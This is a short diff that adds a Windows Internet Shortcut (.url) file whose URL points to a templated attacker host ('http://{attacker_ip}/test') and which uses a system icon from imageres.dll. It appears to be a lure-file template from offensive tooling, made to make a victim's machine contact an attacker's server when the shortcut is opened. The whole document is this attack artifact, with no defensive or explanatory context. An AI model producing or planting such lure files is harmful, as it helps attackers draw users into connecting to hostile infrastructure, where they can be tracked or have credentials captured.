@@ -1,0 +1,5 @@
+[InternetShortcut]
+URL=http://{attacker_ip}/test
+WorkingDirectory=C:\WINDOWS\
+IconIndex=153
+IconFile=C:\Windows\System32\imageres.dll
